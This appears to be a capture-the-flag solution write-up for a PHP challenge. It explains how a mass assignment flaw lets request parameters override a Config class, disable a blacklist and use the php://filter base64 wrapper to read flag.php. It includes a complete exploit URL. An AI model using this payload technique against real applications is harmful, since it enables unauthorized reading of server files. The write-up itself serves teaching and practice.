# Solution

There's mass assignment vulnerability that _allow we override internal configuration defined in the `Config` class_.

Exploit `allow_unsafe` to true.

```php
$loader->assign_props($_GET)
```

Bypass blacklist with config varibles pollution

```bash
  &config[path]=../flag.php
```

Once the blacklist is disabled, we can load PHP stream wrappers, especially:

```php
  php://filter/convert.base64-encode/resource=xxx
```

which has more detail from official website: https://www.php.net/manual/zh/filters.php

So we can use following payload for exploit:

```bash
  http://localhost/index.php/?allow_unsafe=1&config[data_folder]=php://filter/convert.base64-encode/resource=&config[path]=flag.php
```

this payload eventually will be translated to following:

```php
  file_get_contents('php:/filter/convert.base64-encode/resource=flag.php')
```
